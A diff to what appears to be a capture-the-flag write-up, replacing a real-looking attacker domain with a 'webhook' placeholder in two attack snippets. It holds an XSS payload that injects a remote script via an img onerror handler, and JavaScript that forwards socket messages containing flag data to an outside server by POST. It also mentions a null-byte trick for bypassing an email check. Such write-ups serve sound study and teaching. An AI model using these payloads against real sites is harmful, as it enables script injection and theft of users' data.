@@ -22,7 +22,7 @@ The code checks the email with `include`, which can be tricked with a `\x00`
 
 XSS code:
 ```HTML
-<img src=x onerror=document.body.appendChild(document.createElement('script')).src='//mv.jianwei.me/imposter.js'>
+<img src=x onerror=document.body.appendChild(document.createElement('script')).src='//webhook/imposter.js'>
 ```
 
 JS code on the server:
@@ -30,7 +30,7 @@ JS code on the server:
 socket.on('message', function(data){
 
 var httpRequest = new XMLHttpRequest();
-httpRequest.open('POST', 'http://mv.jianwei.me/imposter.php', true);
+httpRequest.open('POST', 'http://webhook/imposter.php', true);
 httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 httpRequest.send('data=from flag message-' + data.content);
 httpRequest.onreadystatechange = function () {
